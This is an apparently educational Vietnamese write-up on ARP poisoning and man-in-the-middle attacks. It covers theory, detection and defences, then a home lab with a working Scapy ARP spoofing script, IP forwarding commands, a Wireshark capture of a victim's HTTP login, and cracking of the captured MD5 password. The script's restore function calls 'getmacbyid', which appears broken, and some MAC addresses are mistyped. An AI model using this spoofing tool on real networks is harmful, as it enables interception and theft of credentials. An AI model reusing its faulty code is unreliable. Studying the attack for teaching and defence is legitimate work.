# ARP Poisoning Attack to Man-in-the-Middle Attack (MITM)

---

## Khái niệm & Dấu hiệu & Khai thác & Phòng tránh

### Khái niệm

- Địa chỉ MAC, là từ viết tắt của Media access control Address, được sử dụng để xác định duy nhất các cổng mạng dành cho việc giao tiếp ở lớp vật lý của mạng. Địa chỉ MAC thường được gắn với card mạng.
- ARP, từ viết tắt của Address Resolution Protocol, được sử dụng để chuyển đổi địa chỉ IP thành địa chỉ vật lý (địa chỉ MAC) trên một bộ chuyển mạch. Máy chủ gửi một tin quảng bá ARP trên mạng và máy tính người nhận phản hồi bằng địa chỉ MAC. Địa chỉ IP/ MAC đã phân giải sau đó sẽ được sử dụng để giao tiếp.

#### Mạng không dậy

- Tấn công ARP Poisoning là tấn công mà Hacker sẽ gửi các địa chỉ MAC giả đến bộ chuyển mạch để nó có thể liên kết các địa chỉ MAC giả với địa chỉ IP của một máy tính thật trên mạng và chiếm đoạt lưu lượng truy cập.
- Kẻ tấn công tạo và gửi một thông báo ARP sai đến hệ thống được định hình. Chúng thêm địa chỉ MAC của mình và địa chỉ IP của mục tiêu trong tin nhắn. Khi nhận và xử lý thông báo ARP sai, hệ thống sẽ đồng bộ địa chỉ MAC của kẻ tấn công với địa chỉ IP.

![image](https://hackmd.io/_uploads/B1tCXNQRT.png)

![image](https://hackmd.io/_uploads/rJm0_y4Ra.png)

- mỗi thiết bị trong mạng sẽ lưu trữ bảng ánh xạ địa chỉ MAC bảng ARP và sẽ được cập nhật liên tục theo thời gian
  - lợi dụng điều này attacker sẽ gửi các gói tin ARP liên tục để bảng này trong thiết bị của victim chứa thông tin sai lệnh và gửi các thông tin truy cập trên mạng đến máy của attacker

![image](https://hackmd.io/_uploads/B1apTN7R6.png)

- Khi mạng LAN kết nối địa chỉ IP với địa chỉ MAC của kẻ xâm nhập, kẻ xâm nhập bắt đầu nhận tất cả các thông báo dành cho địa chỉ MAC hợp pháp. Chúng có thể nghe trộm thông tin liên lạc để truy xuất dữ liệu nhạy cảm khi trao đổi, sửa đổi thông tin liên lạc bằng cách chèn nội dung độc hại hoặc thậm chí xóa dữ liệu trong khi truyền để người nhận không nhận được.

#### Mạng có dậy

- ARP bảo đảm kết nối giữa địa chỉ MAC và địa chỉ IP. Bằng cách truyền đi ARP yêu cầu cùng với địa chỉ IP, switch sẽ biết được thông tin về địa chỉ MAC kết nối từ phản hồi của host. Trong trường hợp không có hoặc không tìm được ánh xạ, nguồn sẽ gửi bản tin đến tất cả các nodes. Chỉ có node với địa chỉ MAC kết hợp với IP đó phản hồi yêu cầu, chuyển tiếp gói tin chứa ánh xạ địa chỉ MAC. Switch sẽ ghi nhớ địa chỉ MAC và thông tin về port kết nối vào bảng CAM cố định độ dài.

![image](https://hackmd.io/_uploads/BJSV814A6.png)

- Như đã thấy ở hình trên, nguồn tạo ra ARP yêu cầu bằng cách gửi một gói tin ARP. Một node có địa chỉ MAC nhận được yêu cầu sẽ phản hồi lại gói tin. Frame sẽ tràn ra tất cả các port (trừ port nhận frame) nếu đầu vào bảng CAM quá tải. Điều này cũng xảy ra khi địa chỉ MAC đích trong frame là địa chỉ truyền tin.

- Kĩ thuật MAC flooding được dùng để chuyển switch thành một hub, trong đó switch bắt đầu truyền gói tin. Trong trường hợp này, user có thể lấy gói tin không dành cho mình.

### Các loại tấn công ARP Poisoning

- Tội phạm mạng có thể khởi chạy các cuộc tấn công ARP theo hai cách: **Giả mạo** và **làm nhiễm độc bộ nhớ cache**

#### Giả mạo ARP

- Giả mạo ARP là một quá trình trong đó tác nhân đe dọa giả mạo và gửi phản hồi ARP tới hệ thống mà chúng đang nhắm mục tiêu. Một câu trả lời giả mạo là tất cả những gì kẻ xâm nhập phải gửi cho hệ thống được đề cập để thêm địa chỉ MAC của nó vào danh sách trắng. Điều này làm cho việc giả mạo ARP dễ dàng thực hiện.
- Những kẻ tấn công cũng sử dụng phương pháp giả mạo ARP để thực hiện các loại tấn công khác, chẳng hạn như chiếm quyền điều khiển phiên, trong đó chúng chiếm lấy các phiên duyệt web của bạn và tấn công Man-in-the-Middle trong đó chúng chặn liên lạc giữa hai thiết bị được kết nối với mạng.

#### Làm nhiễm độc bộ nhớ cache ARP

- Việc làm nhiễm độc trong kiểu tấn công ARP này bắt nguồn từ việc kẻ tấn công tạo và gửi nhiều phản hồi ARP giả mạo tới hệ thống mục tiêu của chúng. Chúng làm điều này đến mức khiến hệ thống tràn ngập các mục nhập không hợp lệ và không thể xác định được các mạng hợp pháp của nó.
- Kỹ thuật gây ra hỗn loạn lưu lượng sẽ nắm bắt cơ hội để chuyển hướng các địa chỉ IP sang hệ thống của chính chúng và chặn những liên lạc đi qua chúng. Các tác nhân đe dọa sử dụng phương thức tấn công ARP này để tạo điều kiện thuận lợi cho những hình thức tấn công khác như từ chối dịch vụ (DoS), trong đó chúng làm tràn ngập hệ thống đích bằng các thông báo không liên quan để gây tắc nghẽn giao thông và sau đó chuyển hướng những địa chỉ IP.

### Dấu hiệu

VD:

| IP Address    | MAC Address       |
| ------------- | ----------------- |
| 192.168.5.1   | 00-14-22-01-23-45 |
| 192.168.5.201 | 40-d4-48-cr-55-b8 |
| 192.168.5.202 | 00-14-22-01-23-45 |

- Nếu bảng chứa hai địa chỉ IP khác nhau có cùng địa chỉ MAC, chứng tỏ một cuộc tấn công ARP đang diễn ra. Vì địa chỉ IP 192.168.5.1 có thể được nhận dạng là bộ định tuyến nên IP của kẻ tấn công có thể là 192.168.5.202.

### Khai thác

- mở giao diện dòng lệnh hoặc cmd và nhập lệnh sau: `arp –a`

![image](https://hackmd.io/_uploads/ByHcGk4A6.png)

- Lưu ý:
  - Các điểm đầu vào động sẽ được thêm và xóa tự động khi sử dụng phiên TCP/ IP với máy tính từ xa.
  - Các điểm đầu vào tĩnh được thêm bằng tay và xóa khi máy tính được khởi động lại và card mạng sẽ được khởi động lại.

#### Mạng không dây

![image](https://hackmd.io/_uploads/Hk1J9kNAT.png)

- ARP poisoning, là một cuộc tấn công Man in the Middle (MitM) cho phép những kẻ tấn công chặn giao tiếp giữa các thiết bị mạng. Cuộc tấn công sẽ diễn ra như sau:
  1.  Kẻ tấn công phải có quyền truy cập vào mạng. Chúng quét mạng để xác định địa chỉ IP của ít nhất hai thiết bị⁠ — giả sử đây là một máy trạm và một bộ định tuyến.
  2.  Kẻ tấn công sử dụng một công cụ giả mạo, chẳng hạn như Arpspoof hoặc Driftnet, để gửi phản hồi ARP giả mạo.
  3.  Các phản hồi giả mạo thông báo rằng địa chỉ MAC chính xác cho cả hai địa chỉ IP, thuộc bộ định tuyến và máy trạm (workstation), là địa chỉ MAC của kẻ tấn công. Điều này đánh lừa cả bộ định tuyến và máy trạm kết nối với máy của kẻ tấn công, thay vì kết nối với nhau.
  4.  Hai thiết bị cập nhật các mục bộ nhớ cache ARP của chúng và từ thời điểm đó trở đi, giao tiếp với kẻ tấn công thay vì trực tiếp với nhau.
  5.  Kẻ tấn công hiện đang bí mật đứng giữa mọi liên lạc.

Kẻ tấn công ARP spoofing giả vờ là cả hai bên tham gia của một kết nối mạng. Khi kẻ tấn công giả mạo ARP, chúng có thể:

- Tiếp tục định tuyến thông tin liên lạc như hiện tại, kẻ tấn công có thể đánh hơi (sniffing) các gói tin và đánh cắp dữ liệu, ngoại trừ trường hợp gói tin được truyền qua một kênh được mã hóa như HTTPS.

- Thực hiện chiếm quyền điều khiển session⁠, nếu kẻ tấn công có được session ID, chúng có thể có quyền truy cập vào tài khoản mà người dùng hiện đang đăng nhập.

- Thay đổi giao tiếp⁠ – ví dụ: đẩy một file hoặc trang web độc hại đến máy tính.

- Tấn công DDoS – những kẻ tấn công có thể cung cấp địa chỉ MAC của server mà chúng muốn tấn công bằng DDoS, thay vì máy của chính chúng. Nếu làm điều này cho một số lượng lớn IP, server mục tiêu sẽ bị tấn công bởi lưu lượng truy cập.

#### Mạng có dây

![image](https://hackmd.io/_uploads/rJUEvJVRT.png)

- Trong tấn công này, kẻ tấn công gửi gói tin ARP giả qua mạng LAN. Swicth sẽ cập nhật địa chỉ MAC của kẻ tấn công với địa chỉ IP của user hoặc server chính thống. Sau đó, switch sẽ chuyển tiếp gói tin đến kẻ tấn công do nhận định đó là MAC của user.

![image](https://hackmd.io/_uploads/S1FkikV0T.png)

- Tấn công ARP Spoofing giúp kẻ tấn công lấy thông tin trích rút từ gói tin. Bên cạnh đó, tấn công này còn được dùng để:

  - Session Hijacking
  - Tấn công từ chối dịch vụ
  - Tấn công man-in-the-middle
  - Nghe trộm gói tin
  - Chặn bắt thông tin
  - Connection Hijacking
  - VoIP tapping
  - Đặt lại kết nối
  - Đánh cắp mật khẩu

### Phòng tránh

- Phần mềm phát hiện tấn công ARP Poisoning: Các hệ thống này có thể được sử dụng để kiểm tra toàn bộ quá trình phân giải địa chỉ IP/ MAC và chứng thực nếu chúng được xác thực. Các quá trình phân giải địa chỉ IP / MAC chưa được chứng thực sẽ bị chặn.

- Bảo mật hệ điều hành: Biện pháp này phụ thuộc vào hệ điều hành được sử dụng. Sau đây là các phương thức được sử dụng bởi các hệ điều hành khác nhau.

  - Nền tảng dựa trên Linux: Bỏ qua các gói trả lời ARP mà không được yêu cầu.
  - Microsoft Windows: bộ nhớ cache ARP có thể được định cấu hình thông qua Registry. Danh sách sau đây bao gồm một số phần mềm có thể được sử dụng để bảo vệ hệ thống mạng khỏi bị nghe trộm.
    - AntiARP: Cung cấp khả năng bảo vệ chống lại cả việc nghe lén bị động và chủ động.
    - Agnitum Outpost Firewall: Cung cấp khả năng bảo vệ chống lại việc nghe lén bị động.
    - XArp: Cung cấp khả năng bảo vệ chống lại nghe lén
  - Mac OS: ArpGuard có thể được sử dụng để chống lại việc nghe lén.

- Sử dụng Mạng riêng ảo (Virtual Private Network - VPN) cho phép các thiết bị kết nối với Internet thông qua một tunnel được mã hóa. Điều này làm cho tất cả thông tin liên lạc được mã hóa và vô giá trị đối với kẻ tấn công ARP spoofing.
  - Mã hóa có thể không có nhiều tác động trong việc ngăn chặn tin tặc xâm nhập vào mạng của bạn bằng các cuộc tấn công ARP Poisoning, nhưng nó sẽ ngăn chúng sửa đổi dữ liệu của bạn nếu chúng nắm giữ dữ liệu đó. Đó là vì mã hóa dữ liệu ngăn những kẻ xâm nhập đọc nội dung mà không có khóa giải mã hợp lệ.
- Sử dụng ARP⁠ tĩnh – giao thức ARP cho phép xác định mục nhập ARP tĩnh cho địa chỉ IP và ngăn thiết bị nghe phản hồi ARP cho địa chỉ đó. Ví dụ: nếu một máy tính luôn kết nối với cùng một bộ định tuyến, bạn có thể xác định một mục ARP tĩnh cho bộ định tuyến đó, điều này giúp ngăn chặn một cuộc tấn công.
- Sử dụng packet filtering⁠ – các packet filtering⁠ có thể xác định các gói ARP bị nhiễm độc bằng cách phát hiện chúng chứa thông tin nguồn xung đột và ngăn chúng lại trước khi chúng đến được các thiết bị trên mạng của bạn.
- Triển khai Dynamic ARP Inspection (DAI)
  - Dynamic ARP Inspection (DAI) là một hệ thống bảo mật mạng xác minh các thành phần ARP có trên mạng. Nó xác định các kết nối có địa chỉ MAC bất hợp pháp đang cố chuyển hướng hoặc chặn các địa chỉ IP hợp lệ.
  - Dynamic ARP Inspection (DAI) kiểm tra tất cả các yêu cầu địa chỉ ARP MAC-to-IP trên hệ thống và xác nhận rằng chúng hợp lệ trước khi cập nhật thông tin trên ARP cache và chuyển chúng đến đúng kênh.

## ARP Cache Poisoning Attack Lab

- mình thực hiện lab này với 2 laptop 1 máy chạy Window 7 đóng giả làm nạn nhân và 1 máy mình cài dual boot với Kali linux làm attacker để **sniff** thông tin

![image](https://hackmd.io/_uploads/rkFl307AT.png)

- để khách quan mình sẽ tiến hành reconnaissance với nmap

```bash!
$ sudo nmap -sV -sC 192.176.45.1/24
```

- thu được thông tin của **routerwifi**

![ảnh](https://hackmd.io/_uploads/rJqKOa7Aa.png)

![ảnh](https://hackmd.io/_uploads/BkM3dpX0p.png)

![ảnh](https://hackmd.io/_uploads/B1IJFpXR6.png)

![ảnh](https://hackmd.io/_uploads/S1G-K6QCa.png)

- thu được thông tin của máy **Window 7**

![ảnh](https://hackmd.io/_uploads/SkbtK67Aa.png)

- chúng ta có thể thấy trong mạng có 3 thiết bị gồm::

  - **routerwifi Tp-Link**
  - **máy kali linux** ![ảnh](https://hackmd.io/_uploads/Sk7gfp7R6.png)
  - **máy window 7**
    ![ảnh](https://hackmd.io/_uploads/B1sQ8p706.png)

- vậy mình được ánh xạ địa chỉ mình dùng trong lab này là:

| Host                    | IP address       | MAC address         |
| ----------------------- | ---------------- | ------------------- |
| `Kali linux` (Attacker) | `192.176.45.101` | `34:6f:24:18:c9:2f` |
| `Window 7` (Victim)     | `192.176.45.102` | `0c:84:dc:f5:3c:79` |
| `Default Gateway`       | `192.176.45.1`   | `c0:61:18:e2:ef:72` |

mình sử dụng thư viện Scapy của Python để thực hiện tấn công ARP Spoofing

- thư viện này đã được cài đặt sẵn trên kali linux
- tấn công với đoạn script trong file **arpspoof.py** như sau:

```python
import scapy.all as scapy
import time

interval = 4
ip_target = input("Enter target IP: ")
ip_gateway = input("Enter gateway IP: ")

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.getmacbyip(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyid(destination_ip)
    source_mac = scapy.getmacbyid(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

try:
    while True:
        spoof(ip_target, ip_gateway)
        spoof(ip_gateway, ip_target)
        time.sleep(interval)
except KeyboardInterrupt:
    restore(ip_gateway, ip_target)
    restore(ip_target, ip_gateway)
```

- đầu tiên mình định nghĩa:
  - `interval`: Định thời gian giữa các lần gửi gói tin độc hại.
  - `ip_target`: Địa chỉ IP của máy mục tiêu mà mình muốn thực hiện tấn công ARP Spoofing.
  - `ip_gateway`: Địa chỉ IP của cổng gateway mạng
- tiếp đó mình định nghĩa hàm `spoof(target_ip, spoof_ip)`:
  - Hàm này tạo gói tin ARP với mục đích là địa chỉ IP của mục tiêu (target_ip), nhưng chứa địa chỉ MAC giả mạo (spoof_ip). Sau đó, nó gửi gói tin này đến máy mục tiêu.
  - ![ảnh](https://hackmd.io/_uploads/Hk7_HCmC6.png)
  - chúng ta có thể thấy khi đặt `op = 2` để reply ARP cho victim tại 192.176.45.102 và chúng ta đã ghi đè ip nguồn là ip của routerwifi 192.176.45.1 nhưng mac nguồn không ghi đè và scapy lấy địa chỉ mac của máy kali attacker
  - ![ảnh](https://hackmd.io/_uploads/BJq8PAX0T.png)
- Định nghĩa hàm `restore(destination_ip, source_ip)`:
  - Hàm này khôi phục lại trạng thái ban đầu của máy mục tiêu và gateway bằng cách gửi gói tin ARP với địa chỉ MAC thực của gateway và máy mục tiêu.
- Trong khối **try**, vòng lặp while True được sử dụng để liên tục thực hiện tấn công ARP Spoofing bằng cách gửi các gói tin giả mạo đến cả gateway và máy mục tiêu. Thời gian giữa các lần gửi gói tin được xác định bởi biến `interval`.

- Khối **except KeyboardInterrupt** sẽ bắt các ngoại lệ được ném ra khi người dùng nhấn `Ctrl+C` để kết thúc chương trình. Trong khối này, các hàm restore() được gọi để khôi phục lại trạng thái ban đầu của gateway và máy mục tiêu trước khi kết thúc chương trình.

### Tiến hành khai thác

đầu tiên dùng lệnh `arp -a`

- chúng ta có thể thấy bảng MAC của máy tính Window 7 trước khi khai thác là:

![ảnh](https://hackmd.io/_uploads/HJ44q6X0T.png)

- bảng MAC của máy kali trước khi khai thác như sau

![ảnh](https://hackmd.io/_uploads/rJ0f-amAa.png)

![ảnh](https://hackmd.io/_uploads/HykwWa7Ca.png)

trước khi tấn công để máy tính của victim vẫn nhận được các gói tin trả về từ routerwifi cũng như các gói tin gửi đến routerwifi chúng ta cần bật NAT Port Forwarding trên máy attacker

- để cho phép các gói tin trả về được đi qua lab của chúng ta forward đến máy victim chúng ta cần dùng lệnh

```bash!
$ sudo su
$ echo 1 > /proc/sys/net/ipv4/ip_forward
$ exit
$ cat /proc/sys/net/ipv4/ip_forward
1
```

sau khi bật ip_forward

- mình chạy file **arpspoof.py** để tấn công

![ảnh](https://hackmd.io/_uploads/BkaSQTmCp.png)

- và để ý trên `wireshark` khi filter các gói tin arp

![ảnh](https://hackmd.io/_uploads/B1hMRT7Ra.png)

- 2 gói arp đến máy window 7 và routerwifi được bắn ra liên tục

![ảnh](https://hackmd.io/_uploads/rJ_ikRm0a.png)

![ảnh](https://hackmd.io/_uploads/SJ83QTXA6.png)

- chúng ta bắt được gói tin trả lời địa chỉ mac của routerwifi ( có ip 192.176.45.1) là `34:6f:24:c9:2f` (mac của kali)

![ảnh](https://hackmd.io/_uploads/SJ1yyAmCT.png)

- chúng ta bắt được gói tin trả lời địa chỉ mac của máy window 7 ( có ip 192.176.45.102) là `34:6f:24:c9:2f` (mac của kali)

- và chúng ta nhận được warning Duplicate

![ảnh](https://hackmd.io/_uploads/rJbtA6QAp.png)

- nhưng khi kiểm tra lại bảng MAC trên máy tính Window 7 thấy địa chỉ mac của gateway đã bị thay đổi thành địa chỉ mac của máy kali (có ip là 192.176.45.101)

![ảnh](https://hackmd.io/_uploads/r1-_qTmCT.png)

- trong khi đó bảng mac của máy kali vẫn không đổi

![ảnh](https://hackmd.io/_uploads/Hk9BBaX0p.png)

- tiếp đó mình đóng giả làm victim thử vào trang web trường mình dùng giao thức http tại địa chỉ qldt.actvn.edu.vn và tiến hành đăng nhập với `username = nguyenhungcuong` và `password = 123`

![ảnh](https://hackmd.io/_uploads/S1Tc5TmAp.png)

- để ý trên máy kali của attacker thấy gói tin http đã được capture bởi wireshark vậy gói tin của victim đã được chuyển qua card mạng của attacker và được wireshark bắt lại

![ảnh](https://hackmd.io/_uploads/B1wuVaX0a.png)

- tìm packet đăng nhập và mình follow http stream

![ảnh](https://hackmd.io/_uploads/rk61HpQR6.png)

- mình được **txtUserName=nguyenhungcuong** và **txtPassword=202cb962ac59075b964b07152d234b70** có độ dài 32 ký tự có vẻ như là hash md5 và mình đem nó lên https://crackstation.net/ để crack nó và được plaintext là `123`.

![ảnh](https://hackmd.io/_uploads/SJguoTQRa.png)

vậy mình đã khai thác **ARP Poisoning** để sniff các packet tài khoản đăng nhập của victim thành công

- tiếp đó chúng ta hoàn toàn có thể thay đổi nội dung của packet với Inject Code vào HTTP Response trong mạng để chiếm cookie của victim xem thêm tại https://tek4.vn/cach-inject-code-vao-http-response-trong-mang-bang-python

  - khi đó chúng ta cần sử dụng scapy và netfilterqueue để tạo một con firewall và chỉnh sửa gói tin khi sniff được (xem thêm tại https://hackmd.io/@JohnathanHuuTri/rkdzitQtn?utm_source=preview-mode&utm_medium=rec)

- sau đó để kết thúc cuộc tấn công mình `CTRL + C` để kill chương trình chạy arpspoof.py
  - và kiểm tra lại bảng MAC của máy window7 đã trở lại bình thường

![ảnh](https://hackmd.io/_uploads/BkR5fCQ0T.png)

![ảnh](https://hackmd.io/_uploads/r1-tGC7AT.png)

## Tham khảo

- https://tek4.vn/cach-inject-code-vao-http-response-trong-mang-bang-python
- https://hackmd.io/@JohnathanHuuTri/rkdzitQtn?utm_source=preview-mode&utm_medium=rec
- https://thepythoncode.com/article/building-arp-spoofer-using-scapy
- https://www.youtube.com/watch?v=C_FKDs7a-mk
